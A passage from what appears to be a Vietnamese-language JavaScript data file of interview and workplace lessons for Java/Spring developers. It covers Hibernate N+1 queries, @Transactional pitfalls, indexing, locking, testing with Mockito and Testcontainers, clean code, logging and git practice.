   Vì quan hệ là LAZY, Hibernate lập tức gửi thêm **1 câu query riêng biệt cho từng Khoa**:
   \`SELECT * FROM employee WHERE department_id = 1\`
   \`SELECT * FROM employee WHERE department_id = 2\`
   ...
   \`SELECT * FROM employee WHERE department_id = 100\`
3. **Tổng cộng:** $1 + 100 = 101$ câu truy vấn gửi xuống cơ sở dữ liệu trong vòng vài phần trăm giây!
Hậu quả: Hết sạch Connection Pool, CPU database vọt lên 100%, server lăn ra chết.

**2 Cách Khắc Phục Chuẩn Kỹ Sư:**
- **Cách 1 (Phổ biến nhất): Dùng \`JOIN FETCH\` trong JPQL:** Bắt Hibernate thực hiện phép \`INNER JOIN\` hoặc \`LEFT JOIN\` ngay trong câu SQL duy nhất.
- **Cách 2: Dùng \`@EntityGraph\`:** Khai báo danh sách các trường liên kết cần nạp kèm mà không cần viết lại JPQL.`,
        badCodeTitle: '❌ Lặp query trong vòng lặp (N+1 Query)',
        badCode: `// Repository mặc định:
List<Department> deps = departmentRepo.findAll(); // 1 Query
for (Department d : deps) {
    // Mỗi lần lặp là 1 Query bắn xuống DB!
    System.out.println(d.getEmployees().size());
}`,
        goodCodeTitle: '✅ Giải quyết triệt để bằng JOIN FETCH',
        goodCode: `public interface DepartmentRepository extends JpaRepository<Department, Long> {
    // 1 câu lệnh SQL duy nhất kéo toàn bộ dữ liệu Department + Employee!
    @Query("SELECT d FROM Department d LEFT JOIN FETCH d.employees")
    List<Department> findAllWithEmployees();
}

// Hoặc dùng EntityGraph:
@EntityGraph(attributePaths = {"employees"})
List<Department> findAll();`,
        interviewTip: 'Lưu ý khi phỏng vấn: "JOIN FETCH có nhược điểm gì không?" ➔ Có! Không nên dùng JOIN FETCH cho nhiều hơn một tập hợp (@OneToMany) cùng lúc vì sẽ sinh ra tích Đề-các (Cartesian Product), làm số bản ghi trả về nhân lên gấp bội, gây tràn bộ nhớ RAM.'
      },
      {
        id: 'transactional-traps',
        title: '2. 3 Cạm Bẫy Chết Người Với @Transactional',
        badge: 'Cạm Bẫy Thường Gặp',
        summary: 'Bỏ quên rollbackFor, dính cạm bẫy Self-Invocation và quên tối ưu readOnly = true cho truy vấn đọc.',
        explanation: `Spring sử dụng cơ chế **AOP Dynamic Proxy** để quản lý transaction. Trước khi vào hàm, Proxy mở connection và bắt đầu transaction; khi hàm chạy xong, Proxy commit; nếu có exception, Proxy rollback.

**3 Cạm bẫy khiến bạn bị fail phỏng vấn hoặc tạo bug trên Production:**
1. **Cạm bẫy 1: Mặc định chỉ rollback với RuntimeException:**
   Nếu phương thức của bạn ném ra một \`Checked Exception\` (ví dụ: \`IOException\`, \`SQLException\`, hoặc class kế thừa trực tiếp từ \`Exception\`), Spring **VẪN SẼ COMMIT** dữ liệu vào database!
   👉 **Khắc phục:** Luôn khai báo: \`@Transactional(rollbackFor = Exception.class)\`.
2. **Cạm bẫy 2: Self-Invocation (Gọi hàm nội bộ):**
   Nếu hàm A (không có @Transactional) gọi hàm B (có @Transactional) trong **CÙNG MỘT CLASS**:
   Lệnh gọi này đi qua con trỏ \`this\` nội bộ chứ không hề đi qua Spring Proxy bọc bên ngoài. Hậu quả: **Transaction của hàm B hoàn toàn không có hiệu lực**!
   👉 **Khắc phục:** Tách hàm B sang một Service riêng biệt.
3. **Cạm bẫy 3: Quên đặt \`readOnly = true\`:**
   Với các hàm chỉ đọc dữ liệu, đặt \`@Transactional(readOnly = true)\` sẽ báo cho Hibernate tắt cơ chế **Dirty Checking** (không cần chụp snapshot của entity để so sánh thay đổi), giúp tiết kiệm lượng lớn CPU và RAM.`,
        badCodeTitle: '❌ Gọi nội bộ tự triệt tiêu Transaction',
        badCode: `@Service
public class OrderService {
    public void process() {
        // Gọi nội bộ qua 'this' ➔ MẤT HOÀN TOÀN @Transactional!
        this.saveOrderWithTx();
    }

    @Transactional // Vô tác dụng khi gọi từ trong cùng class!
    public void saveOrderWithTx() {
        orderRepo.save(new Order());
    }
}`,
        goodCodeTitle: '✅ Tách class và cấu hình rollback chuẩn xác',
        goodCode: `@Service
@RequiredArgsConstructor
public class OrderService {
    private final OrderTxService txService; // Inject service riêng

    public void process() {
        txService.saveOrderWithTx(); // Đi qua Spring Proxy ➔ Hoạt động chuẩn!
    }
}

@Service
public class OrderTxService {
    // Luôn chỉ định rollbackFor và readOnly phù hợp
    @Transactional(rollbackFor = Exception.class)
    public void saveOrderWithTx() {
        // ...
    }
}`,
        interviewTip: 'Khi phỏng vấn hỏi về Transaction Isolation Level, hãy nhớ 4 cấp độ: READ UNCOMMITTED (bị Dirty Read), READ COMMITTED (mặc định của PostgreSQL/Oracle, chặn Dirty Read), REPEATABLE READ (mặc định của MySQL InnoDB, chặn Non-repeatable Read), và SERIALIZABLE (chặn Phantom Read, an toàn nhất nhưng chậm nhất).'
      },
      {
        id: 'b-tree-indexing-left-prefix',
        title: '3. Chỉ Mục B+Tree & Quy Tắc Left-Prefix: Cứu Nguy Database Khỏi Full Table Scan',
        badge: 'Tối Ưu DB Triệu Bản Ghi',
        summary: 'Composite Index (A, B, C) chỉ hoạt động khi tuân thủ Left-Prefix. Tránh ORDER BY offset lớn làm nghẽn I/O bằng Keyset Pagination.',
        explanation: `Khi bảng dữ liệu vượt mốc hàng triệu dòng, một câu lệnh SQL không dùng index sẽ khiến Database phải quét từ đầu đến cuối ổ đĩa (Full Table Scan), làm đơ toàn bộ hệ thống!

**1. Bản chất chỉ mục B+Tree:**
- B+Tree sắp xếp dữ liệu theo thứ tự tăng dần ở các Node lá được liên kết dạng danh sách nối đôi (Doubly Linked List).
- Thời gian tìm kiếm: $O(\\log N)$.
- Giúp tăng tốc cực nhanh cho các phép toán: so sánh bằng (\`=\`), so sánh khoảng (\`BETWEEN\`, \`>\`, \`<\`) và sắp xếp (\`ORDER BY\`).

**2. Quy tắc Tiền tố bên trái (Left-Prefix Rule):**
- Giả sử bạn tạo chỉ mục kết hợp: \`CREATE INDEX idx_user ON users (company_id, department_id, created_at);\`.
- ✅ Dùng được Index: \`WHERE company_id = ?\` hoặc \`WHERE company_id = ? AND department_id = ?\`.
- ❌ KHÔNG DÙNG ĐƯỢC INDEX: \`WHERE department_id = ?\` hoặc \`WHERE created_at > ?\` (vì thiếu cột tiền tố bên trái nhất là \`company_id\`).
- ⚠️ Cạm bẫy toán tử khoảng: Nếu bạn viết \`WHERE company_id = ? AND department_id > 5 AND created_at > ?\`, thì chỉ mục chỉ dùng được cho \`company_id\` và \`department_id\`. Cột \`created_at\` đứng sau dấu so sánh khoảng sẽ bị vô hiệu hóa!

**3. Thảm họa OFFSET lớn & Giải pháp Keyset Pagination:**
- Khi viết \`LIMIT 20 OFFSET 1000000\`, Database vẫn phải đọc **1,000,020 bản ghi** từ đĩa, rồi vứt bỏ 1,000,000 dòng đầu chỉ để lấy 20 dòng cuối!
- **Keyset Pagination (Seek Method):** Nhớ ID của bản ghi cuối cùng của trang trước: \`WHERE id < :lastSeenId ORDER BY id DESC LIMIT 20\`. Database nhảy thẳng tới vị trí đó trong $O(1)$!`,
        asciiDiagram: `Composite Index: (company_id, department_id, created_at)
                    ┌─────────────────────────┐
                    │ [Root Node] B+Tree      │
                    └────────────┬────────────┘
            ┌────────────────────┴────────────────────┐
            ▼                                         ▼
┌────────────────────────┐               ┌────────────────────────┐
│ Leaf Node:             │ ────────────> │ Leaf Node:             │
│ comp=1, dep=10, date=..│  Linked List  │ comp=1, dep=20, date=..│
└────────────────────────┘               └────────────────────────┘
 [Left-Prefix Hợp Lệ]: Tìm theo company_id TRƯỚC -> Nhảy trực tiếp vào nhánh lá
 [Vi Phạm Left-Prefix]: Tìm theo department_id bỏ qua company_id -> BẮT BUỘC FULL TABLE SCAN!`,
        badCodeTitle: '❌ Query vi phạm Left-Prefix và phân trang OFFSET cả triệu bản ghi',
        badCode: `-- Giả sử có Composite Index: (shop_id, status, created_at)
-- ❌ VI PHẠM 1: Bỏ qua shop_id, query chỉ dùng status -> B+Tree vô dụng, Full Table Scan!
SELECT * FROM orders WHERE status = 'COMPLETED' ORDER BY created_at DESC;

-- ❌ VI PHẠM 2: Dùng hàm trên cột có index -> Database không dùng được index!
SELECT * FROM orders WHERE DATE(created_at) = '2026-09-17';

-- ❌ VI PHẠM 3: OFFSET sâu làm chết ổ cứng DB:
SELECT * FROM orders WHERE shop_id = 12 ORDER BY id DESC LIMIT 20 OFFSET 500000;`,
        goodCodeTitle: '✅ Query tuân thủ Left-Prefix & Keyset Pagination siêu tốc',
        goodCode: `-- ✅ Tuân thủ đúng thứ tự Left-Prefix (shop_id -> status -> created_at):
SELECT * FROM orders 
WHERE shop_id = 12 AND status = 'COMPLETED' 
ORDER BY created_at DESC LIMIT 20;

-- ✅ So sánh khoảng giá trị trực tiếp không bọc hàm vào cột:
SELECT * FROM orders 
WHERE shop_id = 12 
  AND created_at >= '2026-09-17 00:00:00' 
  AND created_at <  '2026-09-18 00:00:00';

-- ✅ Keyset Pagination: Chạy 5ms dù bảng có 100 triệu bản ghi:
SELECT * FROM orders 
WHERE shop_id = 12 AND id < :lastOrderId 
ORDER BY id DESC LIMIT 20;`,
        interviewTip: 'Người phỏng vấn hỏi: "Tại sao lệnh SELECT count(*) lại chậm trên bảng lớn?". Trả lời: "Với InnoDB, DB phải scan các chỉ mục để đếm do MVCC (đa phiên bản đồng thời), không có con số count lưu sẵn như MyISAM. Cần dùng Redis để cache số lượng hoặc phân tích EXPLAIN xem có dính Full Index Scan không".'
      },
      {
        id: 'optimistic-vs-pessimistic-lock',
        title: '4. Concurrency Control: Optimistic Locking (@Version) vs Pessimistic Locking',
        badge: 'Chống Race Condition',
        summary: 'Xử lý bài toán 10,000 người cùng bấm mua 1 sản phẩm Flash Sale còn đúng 1 lượng tồn kho. Tránh bán lố hàng (Overselling).',
        explanation: `Khi 2 request cùng lúc đọc một bản ghi trong Database:
- Thread A đọc: \`balance = 100\`, trừ 30 ➔ ghi lại 70.
- Thread B đọc: \`balance = 100\`, trừ 50 ➔ ghi lại 50.
- Kết quả: Tài khoản bị trừ 80 nhưng số dư trong DB lại lưu 50! Lỗi này gọi là **Lost Update** (mất cập nhật do Race Condition).

**1. Optimistic Locking (Khóa lạc quan):**
- **Triết lý:** Tin rằng xung đột hiếm khi xảy ra.
- **Cơ chế:** Thêm cột \`version\` kiểu số nguyên vào bảng. Mỗi lần Update, Hibernate sinh câu lệnh:
  \`UPDATE product SET stock = stock - 1, version = version + 1 WHERE id = ? AND version = ?\`.
- Nếu có ai khác đã sửa trước đó, số version trong DB đã nhảy lên ➔ Câu UPDATE ảnh hưởng 0 dòng ➔ Hibernate ném ngay **OptimisticLockException**.
- **Khi nào dùng:** Tỉ lệ đọc nhiều, tỉ lệ ghi trùng lặp thấp. Hiệu năng cao vì không hề khóa dòng trong DB.

**2. Pessimistic Locking (Khóa bi quan):**
- **Triết lý:** Thà khóa trước chứ không để xảy ra sai sót.
- **Cơ chế:** Dùng \`SELECT ... FOR UPDATE\` (\`PESSIMISTIC_WRITE\`). Database sẽ đặt một Exclusive Lock (X-Lock) lên dòng đó. Mọi transaction khác muốn đọc/ghi dòng này đều phải xếp hàng đợi Transaction đầu tiên commit/rollback xong.
- **Khi nào dùng:** Tỉ lệ tranh chấp cực cao (Flash Sale giật deal, chuyển tiền ngân hàng, đặt vé xem phim).`,
        badCodeTitle: '❌ Check-then-act ngây thơ không có cơ chế khóa',
        badCode: `@Transactional
public void buyProduct(Long productId) {
    Product p = productRepo.findById(productId).orElseThrow();
    // ❌ 100 luồng cùng vào đây thấy stock = 1:
    if (p.getStock() > 0) {
        p.setStock(p.getStock() - 1);
        productRepo.save(p); // Cả 100 luồng đều trừ thành công -> Tồn kho âm -99!
    }
}`,
        goodCodeTitle: '✅ Dùng Pessimistic Lock hoặc Atomic Update',
        goodCode: `public interface ProductRepository extends JpaRepository<Product, Long> {
    // ✅ Cách 1: Pessimistic Lock khóa chặt dòng dữ liệu:
    @Lock(LockModeType.PESSIMISTIC_WRITE)
    @Query("SELECT p FROM Product p WHERE p.id = :id")
    Optional<Product> findByIdWithLock(@Param("id") Long id);

    // ✅ Cách 2: Atomic Conditional Update trực tiếp ở mức Database Engine:
    @Modifying
    @Query("UPDATE Product p SET p.stock = p.stock - :qty WHERE p.id = :id AND p.stock >= :qty")
    int deductStockAtomic(@Param("id") Long id, @Param("qty") int qty);
}

// Khi dùng Atomic Update trong Service:
int updatedRows = productRepo.deductStockAtomic(productId, 1);
if (updatedRows == 0) {
    throw new OutOfStockException("Sản phẩm đã hết hàng!");
}`,
        interviewTip: 'Khi phỏng vấn hỏi về Deadlock trong Pessimistic Lock: "Làm sao chống Deadlock khi 2 giao dịch khóa 2 tài nguyên chéo nhau (Tx1: A->B, Tx2: B->A)?". Trả lời ngay: "Áp dụng quy tắc Lock Ordering: Luôn khóa các tài nguyên theo một thứ tự toàn cục nhất quán (ví dụ sắp xếp theo ID tài khoản tăng dần rồi mới lock: Math.min(idA, idB) rồi đến Math.max(idA, idB))".'
      }
    ]
  },
  {
    id: 'testing-qa',
    title: 'Testing & Mockito Thực Chiến',
    icon: '🧪',
    accentColor: '#a78bfa',
    tagline: 'Viết test cho cả nhánh thành công và thất bại để tự tin mở PR mà không sợ vỡ hệ thống',
    topics: [
      {
        id: 'junit-mockito-aaa',
        title: '1. Cấu Trúc Unit Test Chuẩn: Given - When - Then & Mocking',
        badge: 'Phẩm Chất Kỹ Sư',
        summary: 'Sử dụng Mockito để cô lập tầng Service, giả lập hành vi phụ thuộc và kiểm tra tương tác bằng verify().',
        explanation: `Một Unit Test chuyên nghiệp luôn tuân thủ nguyên tắc **FIRST** (Fast, Independent, Repeatable, Self-validating, Timely) và cấu trúc **Given - When - Then** (hoặc AAA: Arrange - Act - Assert):
1. **Given (Arrange):** Chuẩn bị dữ liệu đầu vào và giả lập hành vi của các bên phụ thuộc (\`when(...).thenReturn(...)\`).
2. **When (Act):** Gọi phương thức nghiệp vụ cần kiểm thử.
3. **Then (Assert):** Kiểm chứng kết quả trả về (\`assertEquals\`) và xác minh rằng các phương thức phụ thuộc được gọi đúng số lần (\`verify\`).

**Phân biệt @Mock vs @Spy vs @InjectMocks:**
- \`@Mock\`: Tạo một con bù nhìn giả hoàn toàn rỗng. Nếu không định nghĩa trước thì gọi hàm sẽ trả về \`null\` hoặc \`0\`. Dùng cho các tầng ngoài như Repository, External API.
- \`@Spy\`: Bọc quanh một object **thật**. Code thật vẫn chạy bình thường, trừ những method nào bạn cố tình can thiệp (stub).
- \`@InjectMocks\`: Object mà bạn đang muốn kiểm thử (ví dụ: \`OrderService\`). Mockito sẽ tự động nhét các \`@Mock\` ở trên vào constructor của đối tượng này.`,
        badCodeTitle: '❌ Test chỉ viết cho qua chuyện, không kiểm tra tương tác',
        badCode: `@Test
void testOrder() {
    // Gọi hàm nhưng không assert gì cả, test luôn pass dù code có bug!
    orderService.createOrder(new OrderRequest());
}`,
        goodCodeTitle: '✅ Unit Test chuẩn mực kiểm thử cả trường hợp lỗi',
        goodCode: `@ExtendWith(MockitoExtension.class)
class OrderServiceTest {
    @Mock private OrderRepository orderRepo;
    @Mock private PaymentGateway paymentGateway;
    @InjectMocks private OrderService orderService;

    @Test
    @DisplayName("Ném ngoại lệ và không lưu DB khi tài khoản không đủ số dư")
    void shouldThrowExceptionWhenInsufficientBalance() {
        // 1. Given
        OrderRequest req = new OrderRequest(1L, new BigDecimal("500.00"));
        when(paymentGateway.hasBalance(1L, req.amount())).thenReturn(false);

        // 2. When & 3. Then
        assertThrows(InsufficientFundsException.class, () -> orderService.createOrder(req));
        
        // Cực kỳ quan trọng: Xác minh rằng hàm save() KHÔNG BAO GIỜ được gọi!
        verify(orderRepo, never()).save(any());
    }
}`,
        interviewTip: 'Người phỏng vấn rất thích ứng viên biết dùng `verify(mock, never()).method()`. Nó chứng minh bạn hiểu rõ luồng nghiệp vụ: khi có lỗi xảy ra thì tuyệt đối không được ghi dữ liệu rác vào cơ sở dữ liệu!'
      },
      {
        id: 'mockmvc-integration',
        title: '2. Integration Test Tầng Controller Với MockMvc',
        badge: 'Test Tích Hợp',
        summary: 'Kiểm tra toàn bộ luồng HTTP Status, Request Validation và JSON Response mà không cần bật Tomcat thật.',
        explanation: `Unit test chỉ kiểm tra logic trong Service. Nhưng làm sao bạn biết annotation \`@Valid\` trên Controller có thực sự chặn được request rỗng? Làm sao biết JSON trả về có đúng format không?
Đó là lúc bạn dùng **MockMvc**:
- MockMvc giả lập luồng xử lý HTTP của Spring DispatcherServlet.
- Chạy cực nhanh vì không cần mở cổng mạng (socket) hay khởi động web server Tomcat thật.
- Kiểm tra trực tiếp được: HTTP Status code, Header, Content-Type và từng trường trong JSON bằng **JsonPath** (\`$.id\`, \`$.name\`).`,
        badCodeTitle: '❌ Test Controller bằng cách bật Postman bấm tay',
        badCode: `// Mở Postman, bấm Send bằng tay mỗi lần sửa code.
// Rất mất thời gian, dễ sót case và không thể chạy tự động trên CI/CD!`,
        goodCodeTitle: '✅ Viết test MockMvc tự động chạy trên CI/CD',
        goodCode: `@WebMvcTest(UserController.class)
class UserControllerTest {
    @Autowired private MockMvc mockMvc;
    @MockBean private UserService userService;

    @Test
    @DisplayName("Trả về 400 Bad Request khi email không đúng định dạng")
    void shouldReturn400WhenEmailIsInvalid() throws Exception {
        String invalidPayload = "{\\"name\\": \\"Khuong\\", \\"email\\": \\"not-an-email\\"}";

        mockMvc.perform(post("/api/v1/users")
                .contentType(MediaType.APPLICATION_JSON)
                .content(invalidPayload))
            .andExpect(status().isBadRequest())
            .andExpect(jsonPath("$.errors.email").exists());
    }
}`,
        interviewTip: 'Phân biệt `@SpringBootTest` (bật toàn bộ context của ứng dụng, chậm hơn) và `@WebMvcTest` (chỉ nạp tầng Controller và MockMvc, chạy nhanh gấp 10 lần).'
      },
      {
        id: 'testcontainers-wiremock',
        title: '3. Integration Test Chân Thực: Testcontainers (PostgreSQL/Redis) & WireMock API',
        badge: 'Chuẩn Big Tech 100%',
        summary: 'Bỏ database giả lập H2 vì sai lệch cú pháp SQL thực tế. Dùng Testcontainers chạy Docker thật và WireMock giả lập bên thứ 3.',
        explanation: `Rất nhiều bạn sinh viên làm đồ án dùng **H2 In-Memory Database** để viết test vì nó nhẹ.
Nhưng khi đi làm, **H2 là cạm bẫy nguy hiểm nhất**:
1. H2 không hỗ trợ các tính năng riêng của PostgreSQL/MySQL như kiểu \`JSONB\`, các câu lệnh \`ON CONFLICT DO UPDATE\`, hàm Full-text search hoặc cơ chế Row-level locking (\`FOR UPDATE\`).
2. Test trên H2 pass 100%, nhưng khi deploy lên Production với PostgreSQL thật thì văng Exception sập cả hệ sinh thái!

**Giải pháp thời đại Container: Testcontainers**
- Testcontainers là thư viện Java cho phép JUnit 5 tự động kích hoạt một Container Docker chứa **PostgreSQL, Redis hoặc Kafka thật** chỉ trong vài giây.
- Sau khi chạy test xong, Testcontainers tự động hủy Container và dọn dẹp sạch sẽ ổ cứng.
- Đảm bảo 100% môi trường test y hệt môi trường Production!

**Giả lập Third-Party API bằng WireMock:**
- Không bao giờ gọi API thanh toán thật (VNPay, Stripe, MoMo) trong Unit/Integration Test (tốn tiền và phụ thuộc mạng).
- WireMock dựng một HTTP Server cục bộ giả lập chính xác: HTTP Status (200, 400, 500), JSON Response body, và mô phỏng được cả mạng lag chập chờn (Network Delay) để test Circuit Breaker!`,
        badCodeTitle: '❌ Dùng H2 giả lập và phụ thuộc API ngoài thật',
        badCode: `# application-test.yml: Dùng H2 giả cầy
spring:
  datasource:
    url: jdbc:h2:mem:testdb;DB_CLOSE_DELAY=-1 # ❌ Không bắt được lỗi cú pháp PostgreSQL thật!
    driver-class-name: org.h2.Driver`,
        goodCodeTitle: '✅ Testcontainers chạy PostgreSQL thật & WireMock giả lập API',
        goodCode: `@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
@Testcontainers
class OrderIntegrationTest {
    // ✅ Khởi tạo PostgreSQL thật trong Docker cho toàn bộ test suite:
    @Container
    static PostgreSQLContainer<?> postgres = new PostgreSQLContainer<>("postgres:16-alpine");

    @DynamicPropertySource
    static void configureProperties(DynamicPropertyRegistry registry) {
        registry.add("spring.datasource.url", postgres::getJdbcUrl);
        registry.add("spring.datasource.username", postgres::getUsername);
        registry.add("spring.datasource.password", postgres::getPassword);
    }

    @Test
    void shouldProcessOrderSuccessfullyWithWireMock() {
        // ✅ Dùng WireMock giả lập cổng thanh toán Stripe trả về 200 OK:
        stubFor(post(urlEqualTo("/v1/charges"))
            .willReturn(aResponse()
                .withStatus(200)
                .withHeader("Content-Type", "application/json")
                .withBody("{\\"status\\": \\"succeeded\\", \\"charge_id\\": \\"ch_123\\"}")));

        // Gọi service và kiểm tra kết quả lưu vào Postgres thật:
        OrderResponse res = orderService.checkout(new OrderRequest("ITEM-1", 100L));
        assertEquals("PAID", res.status());
    }
}`,
        interviewTip: 'Nếu phỏng vấn hỏi: "Dự án của em viết Integration Test như thế nào?", hãy tự tin trả lời: "Bọn em dùng Testcontainers để chạy container PostgreSQL và Redis thật nhằm đảm bảo tính tương thích tuyệt đối với Production, kết hợp WireMock để stub các API bên thứ ba như cổng thanh toán để test cả các kịch bản timeout và lỗi 5xx". Phỏng vấn viên Senior sẽ lập tức đánh giá bạn ở level Middle/Senior!'
      }
    ]
  },
  {
    id: 'clean-code-workplace',
    title: 'Clean Code, Logging & Tác Phong Đi Làm',
    icon: '🛡️',
    accentColor: '#2dd4bf',
    tagline: 'Viết code phẳng dễ đọc, ghi log có bối cảnh và phối hợp chuyên nghiệp trong nhóm',
    topics: [
      {
        id: 'guard-clauses',
        title: '1. Quy Tắc Guard Clauses (Bouncer Pattern): Tiêu Diệt Kim Tự Tháp If-Else',
        badge: 'Clean Code Sống Còn',
        summary: 'Kiểm tra điều kiện lỗi và return sớm ngay tại đầu hàm để luồng chính luôn nằm phẳng ở ngoài cùng.',
        explanation: `Khi xem code của một bạn sinh viên hoặc lập trình viên mới đi làm, dấu hiệu nhận biết rõ nhất là **"Kim Tự Tháp Lồng Nhau" (Pyramid of Doom)**:
\`\`\`java
if (input != null) {
    if (user.isActive()) {
        if (hasPermission) {
            // Logic chính nằm thụt vào 4-5 tab thụt đầu dòng!
        }
    }
}
\`\`\`
Người đọc phải căng não giữ trong đầu 4 tầng điều kiện để hiểu dòng code ở giữa.

**Giải pháp: Bouncer Pattern (Người bảo vệ gác cửa)**
Hãy hình dung người bảo vệ trước cửa quán bar: Ai không đủ tuổi hoặc không có vé thì đuổi về ngay tại cửa!
- Đảo ngược điều kiện \`if\`: kiểm tra các trường hợp không hợp lệ trước.
- Thoát ra ngay lập tức bằng \`return\` hoặc \`throw Exception\`.
- Sau khi qua hết các "người gác cửa", luồng xử lý chính (Happy Path) sẽ nằm phẳng phiu ở cấp thụt lề 0.`,
        badCodeTitle: '❌ Thụt lề 4-5 tầng khó đọc',
        badCode: `public OrderResult checkout(Cart cart, User user) {
    if (cart != null && !cart.isEmpty()) {
        if (user != null && user.isActive()) {
            if (paymentGateway.isOnline()) {
                return doCheckout(cart, user);
            } else {
                return OrderResult.error("Gateway offline");
            }
        } else {
            return OrderResult.error("User invalid");
        }
    }
    return OrderResult.error("Cart empty");
}`,
        goodCodeTitle: '✅ Bouncer Pattern: Phẳng phiu, đọc như danh sách việc cần làm',
        goodCode: `public OrderResult checkout(Cart cart, User user) {
    if (cart == null || cart.isEmpty()) {
        return OrderResult.error("CART_EMPTY", "Giỏ hàng không có sản phẩm");
    }
    if (user == null || !user.isActive()) {
        return OrderResult.error("USER_INACTIVE", "Tài khoản không hợp lệ");
    }
    if (!paymentGateway.isOnline()) {
        return OrderResult.error("GATEWAY_OFFLINE", "Cổng thanh toán tạm dừng");
    }

    // Happy Path nằm phẳng hoàn toàn:
    return doCheckout(cart, user);
}`,
        interviewTip: 'Khi được yêu cầu làm bài test Live Coding, việc áp dụng Guard Clauses ngay từ những dòng code đầu tiên sẽ khiến Senior chấm điểm thán phục vì tác phong code cực kỳ già dặn.'
      },
      {
        id: 'structured-logging',
        title: '2. Nghệ Thuật Ghi Log: SLF4J, Correlation ID & Tại Sao CẤM Println?',
        badge: 'Chuẩn Production',
        summary: 'System.out là I/O đồng bộ làm nghẽn luồng. Dùng SLF4J với tham số {} và gắn Correlation ID để trace lỗi.',
        explanation: `**Tại sao cấm hoàn toàn System.out.println trong dự án?**
1. \`System.out\` thực hiện lệnh I/O đồng bộ (Synchronized Block). Dưới tải cao, hàng ngàn luồng sẽ phải xếp hàng chờ đợi nhau chỉ để in ra 1 dòng chữ, làm sập tốc độ xử lý của server!
2. Không có **Log Level** (không thể tắt log debug khi lên Production).
3. Không ghi nhận được **Timestamp, Thread Name, Class Name** và không thể xuất ra định dạng JSON để hệ thống Elasticsearch/Datadog phân tích.

**Quy tắc ghi log chuẩn doanh nghiệp:**
- Dùng \`log.info("Khởi tạo đơn hàng thành công | id={} | amount={}", id, amount);\` (Luôn dùng placeholder \`{}\` để không tốn chi phí nối chuỗi khi log level bị tắt).
- Gắn **Correlation ID (X-Request-ID)** vào MDC (Mapped Diagnostic Context) ở tầng Filter: Mỗi request đi vào hệ thống sẽ có một mã UUID duy nhất đi kèm trên tất cả các dòng log, giúp bạn lọc chính xác toàn bộ lịch sử của 1 người dùng giữa hàng triệu dòng log!`
      },
      {
        id: 'git-hygiene-branching',
        title: '3. Git Hygiene Đi Làm: Atomic Commits, Tránh PR Khổng Lồ & Rebase',
        badge: 'Tác Phong Đồng Đội',
        summary: 'Tách PR dưới 400 dòng code, viết commit theo Conventional Commits và dùng rebase để lịch sử git phẳng phiu.',
        explanation: `Khi làm việc trong môi trường doanh nghiệp, Git không chỉ là công cụ lưu trữ mà là phương tiện giao tiếp chính giữa bạn và đồng nghiệp:
1. **Quy tắc Atomic Commits:** Mỗi commit chỉ giải quyết đúng MỘT thay đổi nhỏ và độc lập. Không gộp vừa thêm tính năng, vừa fix bug, vừa format code vào cùng 1 commit.
2. **Kích thước PR lý tưởng (< 400 dòng):** Một PR 1,000 dòng sẽ bị Senior ngâm 2 tuần vì quá ngán, hoặc review qua loa với chữ "LGTM" và để lọt bug nghiêm trọng. PR 200-300 dòng được review trong 30 phút và merge ngay lập tức!
3. **Quy chuẩn Conventional Commits:**
   - \`feat(order): thêm API tính phí vận chuyển theo khu vực\`
   - \`fix(auth): xử lý NullPointerException khi token rỗng\`
   - \`refactor(user): chuyển sang dùng Constructor Injection\`
   - \`test(payment): bổ sung unit test cho trường hợp thẻ hết hạn\`
4. **Luôn rebase trước khi tạo PR:** Thay vì \`git merge develop\` làm rối tung cây lịch sử commit với hàng chục merge commit rác, hãy dùng \`git checkout feature && git rebase develop\`.`,
        badCodeTitle: '❌ Commit cẩu thả và PR khổng lồ',
        badCode: `// Lịch sử commit:
git commit -m "fix bug"
git commit -m "update"
git commit -m "done task"
// PR gồm 58 files, 2,400 dòng thay đổi gom cả auth, order, payment vào 1 PR!`,
        goodCodeTitle: '✅ Conventional Commits và Atomic PR',
        goodCode: `// Lịch sử commit sạch sẽ:
git commit -m "feat(order): tích hợp tính phí vận chuyển GHN (JIRA-402)"
git commit -m "test(order): viết unit tests cho ShippingFeeCalculator"
// PR chỉ gồm 4 files, 180 dòng thay đổi, có đính kèm ảnh chụp Swagger test`,
        interviewTip: 'Khi phỏng vấn được hỏi: "Em xử lý thế nào khi gặp Merge Conflict?", hãy tự tin trả lời: "Em checkout về nhánh develop để pull code mới nhất, sau đó sang nhánh tính năng gõ git rebase develop. Em giải quyết conflict từng commit một trên IDE, chạy lại test để đảm bảo không gãy logic, rồi mới dùng git push --force-with-lease lên remote".'
      }
    ]
  },
  {
    id: 'workplace-senior-mindset',
    title: 'Bí Quyết Đi Làm & Tư Duy Senior',
    icon: '💼',
    accentColor: '#ec4899',
    tagline: 'Quy tắc ứng xử công sở, nghệ thuật đặt câu hỏi, estimate không sợ trễ hạn, và tư duy làm chủ công việc (Ownership)',
    topics: [
      {
        id: 'the-15-minute-rule',
        title: '1. Nghệ Thuật Đặt Câu Hỏi Chuẩn Kỹ Sư: Quy Tắc 15 Phút & Công Thức 4 Phần',
        badge: 'Kỹ Năng Sinh Tồn Số 1',
        summary: 'Đừng hỏi "Anh ơi code em lỗi", hãy hỏi theo công thức 4 phần sau khi đã tự điều tra 15-30 phút.',
        explanation: `Một trong những lý do lớn nhất khiến Intern/Fresher bị Senior "ngại" hỗ trợ là thói quen: Vừa thấy console báo chữ đỏ là quay sang gọi anh ơi ngay lập tức, trong khi chưa hề đọc xem lỗi nói gì.
Ngược lại, có bạn lại "giấu dốt", ngồi ôm 1 lỗi ngớ ngẩn cả 2 ngày không dám hỏi ai vì sợ bị chê dở, dẫn đến trễ hạn cả sprint!

**Quy tắc 15-30 phút (The 15-Minute Rule):**
- Khi gặp blocker: Bắt buộc dành từ 15 đến 30 phút tự nghiên cứu (đọc stack trace, google mã lỗi, kiểm tra log, đặt breakpoint debug).
- Sau 30 phút nếu vẫn chưa tìm ra hướng đi: **BẮT BUỘC PHẢI ĐI HỎI NGAY**, tuyệt đối không ngồi mò tiếp một mình.

**Công thức đặt câu hỏi 4 phần chuyên nghiệp:**
1. **Bối cảnh (Goal):** Em đang triển khai tính năng gì / API nào?
2. **Triệu chứng & Mã lỗi (Symptom):** Lỗi gì xảy ra ở dòng code nào (đính kèm stack trace và correlation ID)?
3. **Những gì em đã thử (Attempts):** Em đã thử giải pháp A, B nhưng gặp kết quả C.
4. **Giả thuyết của em (Hypothesis):** Em nghi ngờ nguyên nhân là do X, anh có thể cho em xin 5 phút định hướng giúp em được không?`,
        badCodeTitle: '❌ Câu hỏi khiến Senior khó chịu và tốn thời gian',
